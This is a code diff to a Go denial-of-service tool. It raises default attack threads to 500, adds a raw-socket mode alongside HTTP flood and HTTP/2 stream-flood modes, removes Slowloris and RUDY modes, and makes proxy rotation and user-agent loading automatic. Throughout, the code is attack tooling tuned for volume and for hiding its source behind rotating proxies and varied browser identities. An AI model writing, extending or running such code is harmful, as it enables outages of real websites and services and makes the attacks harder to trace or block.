@@ -14,7 +14,7 @@ func New(config DDoSConfig) *DDoSAttack {
 		config.Method = "GET"
 	}
 	if config.MaxThreads <= 0 {
-		config.MaxThreads = 100
+		config.MaxThreads = 500
 	}
 	if config.Duration <= 0 {
 		config.Duration = 60 * time.Second
@@ -25,20 +25,26 @@ func New(config DDoSConfig) *DDoSAttack {
 	if config.AttackMode == "" {
 		config.AttackMode = ModeFlood
 	}
-	if config.SlowlorisDelay <= 0 {
-		config.SlowlorisDelay = 10 * time.Second
-	}
 	if config.Headers == nil {
 		config.Headers = make(map[string]string)
 	}
 	if config.MaxStreamsPerConn <= 0 {
 		config.MaxStreamsPerConn = 100 // Default HTTP/2 streams per connection
 	}
-	if config.RUDYDelay <= 0 {
-		config.RUDYDelay = 10 * time.Second // Default delay between bytes
+
+	// Auto-load proxies from default file if ProxyList is empty
+	if len(config.ProxyList) == 0 {
+		if proxies, err := loadProxiesFromFile(); err == nil && len(proxies) > 0 {
+			config.ProxyList = proxies
+			// Enable proxy rotation by default when proxies are auto-loaded
+			if !config.RotateProxy {
+				config.RotateProxy = true
+			}
+		}
 	}
-	if config.RUDYBodySize <= 0 {
-		config.RUDYBodySize = 1024 * 1024 // Default 1MB body size
+
+	if !config.RotateProxy && len(config.ProxyList) > 0 {
+		config.RotateProxy = true // Default to true for load distribution
 	}
 
 	attack := &DDoSAttack{
@@ -53,17 +59,23 @@ func New(config DDoSConfig) *DDoSAttack {
 		attack.proxies = append([]string(nil), config.ProxyList...)
 	}
 
-	// Load user agents (custom from file or built-in)
-	if config.UseCustomUserAgents && config.UserAgentFilePath != "" {
-		if agents, err := loadUserAgentsFromFile(config.UserAgentFilePath); err == nil && len(agents) > 0 {
+	// Load user agents (auto-load from default file, fallback to built-in)
+	if config.UserAgentFile != "" {
+		// Use custom user agent file if specified
+		if agents, err := loadUserAgentsFromFile(config.UserAgentFile); err == nil && len(agents) > 0 {
 			attack.userAgents = agents
 		} else {
 			// Fallback to built-in agents if file loading fails
 			attack.userAgents = getBuiltInUserAgents()
 		}
 	} else {
-		// Use built-in user agents
-		attack.userAgents = getBuiltInUserAgents()
+		// Auto-load from default user-agent.txt file
+		if agents, err := loadUserAgentsFromDefaultFile(); err == nil && len(agents) > 0 {
+			attack.userAgents = agents
+		} else {
+			// Fallback to built-in user agents if file loading fails
+			attack.userAgents = getBuiltInUserAgents()
+		}
 	}
 
 	return attack
@@ -91,6 +103,10 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 	atomic.StoreInt64(&d.bytesReceived, 0)
 	atomic.StoreInt64(&d.activeConns, 0)
 	atomic.StoreInt64(&d.totalResponseTime, 0)
+	atomic.StoreInt64(&d.poolHits, 0)
+	atomic.StoreInt64(&d.poolMisses, 0)
+	atomic.StoreInt64(&d.totalBatches, 0)
+	atomic.StoreInt64(&d.successfulBatches, 0)
 
 	// Start progress reporter
 	go d.reportProgress()
@@ -99,24 +115,18 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 	switch d.config.AttackMode {
 	case ModeFlood:
 		d.startFloodAttack()
-	case ModeSlowloris:
-		d.startSlowlorisAttack()
-	case ModeMixed:
-		// Split threads between flood and slowloris
-		floodThreads := d.config.MaxThreads * 70 / 100
-		slowThreads := d.config.MaxThreads - floodThreads
-		d.startFloodWorkers(floodThreads)
-		d.startSlowlorisWorkers(slowThreads)
-	case ModeHTTP2StreamFlood:
+	case ModeHTTP2:
 		d.startHTTP2StreamFlood()
-	case ModeRUDY:
-		d.startRUDYAttack()
-	case ModeTLSHandshakeFlood:
-		d.startTLSHandshakeFlood()
+	case ModeRaw:
+		d.startRawSocketAttack()
+	default:
+		// Default to flood if unknown mode
+		d.startFloodAttack()
 	}
 
 	return nil
 }
+
 
 // Wait waits for the attack to complete
 func (d *DDoSAttack) Wait() {
@@ -164,6 +174,15 @@ func (d *DDoSAttack) GetStats() AttackStats {
 		d.proxyMu.Unlock()
 	}
 
+	// Calculate efficiency statistics
+	poolHits := atomic.LoadInt64(&d.poolHits)
+	poolMisses := atomic.LoadInt64(&d.poolMisses)
+	totalPoolRequests := poolHits + poolMisses
+	var poolHitRate float64
+	if totalPoolRequests > 0 {
+		poolHitRate = float64(poolHits) / float64(totalPoolRequests)
+	}
+
 	return AttackStats{
 		RequestsSent:      sent,
 		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
@@ -176,6 +195,8 @@ func (d *DDoSAttack) GetStats() AttackStats {
 		RequestsPerSec:    rps,
 		ActiveProxies:     activeProxies,
 		DisabledProxies:   disabledProxies,
+		ConnectionsReused: poolHits,
+		PoolHitRate:       poolHitRate,
 	}
 }
 
